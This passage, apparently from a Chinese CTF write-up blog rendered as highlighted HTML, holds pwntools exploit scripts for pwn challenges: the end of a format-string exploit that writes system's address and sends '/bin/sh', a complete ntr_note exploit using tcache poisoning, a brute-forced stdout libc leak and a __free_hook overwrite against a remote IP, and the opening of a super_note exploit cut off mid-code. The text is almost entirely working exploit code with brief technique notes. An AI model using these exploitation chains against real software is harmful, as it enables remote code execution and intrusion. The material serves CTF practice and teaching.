punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">+</span><span class=\"token number\">4</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%24$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span>  <span class=\"token string\">\"%\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>system_addr <span class=\"token operator\">>></span><span class=\"token number\">16</span><span class=\"token operator\">>></span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffff</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">\"c%37$hn\"</span>  <span class=\"token operator\">+</span> <span class=\"token string\">\"niyahgalatea\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"niyahgalatea\"</span><span class=\"token punctuation\">)</span>\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#gdb.attach(p,\"printf\")</span>\n\n<span class=\"token comment\">#pause()</span>\n\npayload <span class=\"token operator\">=</span> <span class=\"token string\">\"61happy\\x00\"</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"/bin/sh\\x00\"</span>\nsl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#payload = </span>\n\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n<h1 id=\"ntr_note\"><a class=\"markdownIt-Anchor\" href=\"#ntr_note\">#</a> ntr_note</h1>\n<p>libc-2.31 没 show，爆破了两次，stdout 进行泄露，脚本 1/256 成功率</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- coding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys\n<span class=\"token keyword\">import</span> os\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">import</span> galatea\ncontext<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span> os <span class=\"token operator\">=</span> <span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>timeout <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#context.log_level = 'debug'</span>\n\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'ntr_note'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'ntr_note'</span><span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span>elf<span class=\"token punctuation\">.</span>libc\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\n\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n  p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./ntr_note'</span><span class=\"token punctuation\">)</span>\n  <span class=\"token comment\">#p = process([\"qemu-aarch64\",\"-L\",\"\",binary])</span>\n  <span class=\"token comment\">#p = process([\"qemu-aarch64\",\"-L\",\"\",-g,\"1234\",binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n  host <span class=\"token operator\">=</span> <span class=\"token string\">\"81.68.86.115\"</span>\n  port <span class=\"token operator\">=</span>  <span class=\"token string\">\"10000\"</span>\n  p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>     \t<span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\x7f\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>     \t<span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\xf7\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b  \t<span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b \t<span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">\": 0x%x\"</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload\t<span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>      \t<span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload\t<span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a    \t<span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a    \t<span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n  pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"choice >>\"</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"size:\"</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"content:\"</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  cmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"idx:\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  cmd<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"idx:\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n  sa<span class=\"token punctuation\">(</span><span class=\"token string\">\"content:\"</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">to_pwn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"aaaa\"</span><span class=\"token punctuation\">)</span>\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"aaaa\"</span><span class=\"token punctuation\">)</span>\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"aaaa\"</span><span class=\"token punctuation\">)</span>\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"aaaa\"</span><span class=\"token punctuation\">)</span>\n\n  delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n  delete<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n\n  edit<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> p16<span class=\"token punctuation\">(</span><span class=\"token number\">0x7010</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#4</span>\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#5</span>\n  <span class=\"token comment\">#dbg()</span>\n  edit<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">9</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0007000700070007</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n  delete<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span>\n  \n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#6</span>\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#7</span>\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#8</span>\n\n  delete<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\n  delete<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span>\n\n  edit<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\xb0\"</span><span class=\"token punctuation\">)</span> \n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#9</span>\n\n  edit<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span>p16<span class=\"token punctuation\">(</span><span class=\"token number\">0x26a0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#10</span>\n  edit<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0001000100010001</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n  \n  payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xfbad1800</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"\\x00\"</span>\n\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span> <span class=\"token comment\">#11</span>\n\n  leak <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n  stdout <span class=\"token operator\">=</span> leak <span class=\"token operator\">+</span> <span class=\"token number\">0x336da</span>\n  libc_base <span class=\"token operator\">=</span> stdout <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"_IO_2_1_stdout_\"</span><span class=\"token punctuation\">]</span>\n  system_addr <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">]</span>\n  __free_hook <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"__free_hook\"</span><span class=\"token punctuation\">]</span>\n  __malloc_hook <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"__malloc_hook\"</span><span class=\"token punctuation\">]</span>\n\n  lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"leak\"</span><span class=\"token punctuation\">,</span>leak<span class=\"token punctuation\">)</span>\n  lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"stdout\"</span><span class=\"token punctuation\">,</span>stdout<span class=\"token punctuation\">)</span>\n  lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"__free_hook\"</span><span class=\"token punctuation\">,</span>__free_hook<span class=\"token punctuation\">)</span>\n  lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"__malloc_hook\"</span><span class=\"token punctuation\">,</span>__malloc_hook<span class=\"token punctuation\">)</span>\n  \n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#12</span>\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#13</span>\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"/bin/sh\\x00\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#14</span>\n  delete<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span>\n  delete<span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span>\n  edit<span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>__free_hook<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span>\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>system_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n  delete<span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">)</span>\n\n  p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n\ni <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">while</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n    i <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n    log<span class=\"token punctuation\">.</span>warn<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n        to_pwn<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">except</span> Exception<span class=\"token punctuation\">:</span>\n        p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">continue</span>\n</code></pre>\n<h1 id=\"super_note\"><a class=\"markdownIt-Anchor\" href=\"#super_note\">#</a> super_note</h1>\n<p>先爆破 std_out，再在栈上写 ORW，终于会了</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \n<span class=\"token keyword\">import</span> galatea \ncontext<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span> os <span class=\"token operator\">=</span> <span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>timeout <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span> \nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'super_note'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'super_note'</span><span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n  p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n  <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',binary])</span>\n  <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',-g,'1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n  host <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n  port <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\n  p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': 0x%x'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n  pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"choice:\"</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>context<span class=\"token operator\">=</span><span class=\"token string\">\"aaa\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  cmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n  sa<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span>context<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  cmd<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n  sla<span class=\"token punctuation\">(</span><span 